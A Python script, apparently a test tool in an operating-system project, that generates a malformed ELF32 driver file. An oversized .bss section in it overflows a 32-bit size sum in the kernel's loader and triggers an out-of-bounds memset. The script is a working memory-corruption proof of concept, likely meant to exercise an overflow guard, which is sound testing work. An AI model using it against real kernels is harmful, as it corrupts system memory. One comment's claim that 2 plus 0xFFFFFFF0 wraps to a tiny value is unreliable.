#!/usr/bin/env python3
"""
gen_maldrv.py — Generate a malicious i386 ELF32 REL .DRV file.

This crafted driver triggers a uint32_t overflow in the kernel's
driver_i386_layout_sections() by declaring a SHT_NOBITS (.bss) section
with size 0xFFFFFFF0.  The kernel header validation passes because:
  1. The ELF header is a valid ELF32/i386/ET_REL.
  2. SHT_NOBITS sections skip the file-range check.

Without an overflow guard the kernel computes a tiny load_size, allocates
a small buffer, then calls memset(dest, 0, 0xFFFFFFF0) — corrupting
kernel memory.

Usage:
    python3 tools/gen_maldrv.py <output.drv>
"""

import struct
import sys
import os

# ── ELF32 constants (must match driver_i386_elf32_internal.h) ──────────────
EI_NIDENT       = 16
ET_REL          = 1
EM_386          = 3
EV_CURRENT      = 1
ELFCLASS32      = 1
ELFDATA2LSB     = 1
ELF_HEADER_SIZE = 52
SH_ENTRY_SIZE   = 40

SHT_NULL        = 0
SHT_PROGBITS    = 1
SHT_STRTAB      = 3
SHT_NOBITS      = 8

SHF_ALLOC       = 0x2

# Overflow payload: this is the malicious .bss section size.
# When added to a small load_size the uint32_t wraps around.
EVIL_BSS_SIZE   = 0xFFFFFFF0


def build_elf32_ident():
    """Build the 16-byte ELF identification field."""
    ident = bytearray(EI_NIDENT)
    ident[0] = 0x7F          # EI_MAG0
    ident[1] = ord('E')      # EI_MAG1
    ident[2] = ord('L')      # EI_MAG2
    ident[3] = ord('F')      # EI_MAG3
    ident[4] = ELFCLASS32    # EI_CLASS
    ident[5] = ELFDATA2LSB   # EI_DATA
    ident[6] = EV_CURRENT    # EI_VERSION
    return bytes(ident)


def build_shstrtab():
    """Build section-name string table.

    Index layout:
        0: '' (null)
        1: '.text'
        7: '.bss_evil'
       17: '.shstrtab'
    """
    names = b'\x00.text\x00.bss_evil\x00.shstrtab\x00'
    return names


def build_section_header(name_idx, sh_type, flags, offset, size,
                         addralign=1, link=0, info=0, entsize=0):
    """Pack one Elf32_Shdr (40 bytes)."""
    return struct.pack('<IIIIIIIIII',
                       name_idx,   # sh_name
                       sh_type,    # sh_type
                       flags,      # sh_flags
                       0,          # sh_addr
                       offset,     # sh_offset
                       size,       # sh_size
                       link,       # sh_link
                       info,       # sh_info
                       addralign,  # sh_addralign
                       entsize)    # sh_entsize


def main():
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <output.drv>', file=sys.stderr)
        sys.exit(1)

    out_path = sys.argv[1]

    # ── Layout plan ────────────────────────────────────────────────────
    # Offset 0x00: ELF header (52 bytes)
    # Offset 0x34: .text content (1 byte: 0xCC = int3)
    # Offset 0x35: .shstrtab content
    # After .shstrtab: section header table (4 entries x 40 bytes)

    text_content = b'\xCC'            # single INT3 opcode
    shstrtab = build_shstrtab()

    text_offset = ELF_HEADER_SIZE     # 0x34
    text_size   = len(text_content)

    shstrtab_offset = text_offset + text_size
    shstrtab_size   = len(shstrtab)

    shoff = shstrtab_offset + shstrtab_size
    # Align shoff to 4 bytes for cleanliness
    shoff = (shoff + 3) & ~3

    num_sections = 4
    shstrndx     = 3   # .shstrtab is section index 3

    # ── String table name indices ──────────────────────────────────────
    # b'\x00.text\x00.bss_evil\x00.shstrtab\x00'
    #  0     1       7          17
    NAME_TEXT     = 1
    NAME_BSS_EVIL = 7
    NAME_SHSTRTAB = 17

    # ── Build ELF header ──────────────────────────────────────────────
    ident = build_elf32_ident()
    ehdr = ident + struct.pack('<HHIIIIIHHHHHH',
                               ET_REL,          # e_type
                               EM_386,          # e_machine
                               EV_CURRENT,      # e_version
                               0,               # e_entry
                               0,               # e_phoff
                               shoff,           # e_shoff
                               0,               # e_flags
                               ELF_HEADER_SIZE, # e_ehsize
                               0,               # e_phentsize
                               0,               # e_phnum
                               SH_ENTRY_SIZE,   # e_shentsize
                               num_sections,    # e_shnum
                               shstrndx)        # e_shstrndx
    assert len(ehdr) == ELF_HEADER_SIZE

    # ── Build section headers ─────────────────────────────────────────
    # [0] SHT_NULL
    sh_null = build_section_header(0, SHT_NULL, 0, 0, 0)

    # [1] .text — SHT_PROGBITS | SHF_ALLOC, 1 byte, legitimate content
    sh_text = build_section_header(NAME_TEXT, SHT_PROGBITS, SHF_ALLOC,
                                   text_offset, text_size, addralign=1)

    # [2] .bss_evil — SHT_NOBITS | SHF_ALLOC, size = 0xFFFFFFF0
    #     This is the overflow payload.  Because SHT_NOBITS skips the
    #     file-range validation, the kernel accepts this section.
    #     load_size after .text = 2, then += 0xFFFFFFF0 wraps to
    #     a tiny value (~0xFFFFFFF2 mod 2^32).
    sh_bss = build_section_header(NAME_BSS_EVIL, SHT_NOBITS, SHF_ALLOC,
                                  0, EVIL_BSS_SIZE, addralign=4)

    # [3] .shstrtab
    sh_shstrtab = build_section_header(NAME_SHSTRTAB, SHT_STRTAB, 0,
                                       shstrtab_offset, shstrtab_size)

    # ── Assemble the file ─────────────────────────────────────────────
    blob = bytearray()
    blob += ehdr
    blob += text_content
    blob += shstrtab

    # Pad to shoff
    while len(blob) < shoff:
        blob += b'\x00'

    blob += sh_null
    blob += sh_text
    blob += sh_bss
    blob += sh_shstrtab

    # ── Write output ──────────────────────────────────────────────────
    os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
    with open(out_path, 'wb') as f:
        f.write(blob)

    file_size = len(blob)
    print(f'gen_maldrv: wrote {file_size} bytes to {out_path}')
    print(f'  ELF header:    0x00 ({ELF_HEADER_SIZE} bytes)')
    print(f'  .text:         0x{text_offset:02x} ({text_size} bytes)')
    print(f'  .shstrtab:     0x{shstrtab_offset:02x} ({shstrtab_size} bytes)')
    print(f'  section hdrs:  0x{shoff:02x} ({num_sections}x{SH_ENTRY_SIZE} bytes)')
    print(f'  .bss_evil size: 0x{EVIL_BSS_SIZE:08x} (overflow payload)')
    print(f'  total file:    {file_size} bytes')


if __name__ == '__main__':
    main()
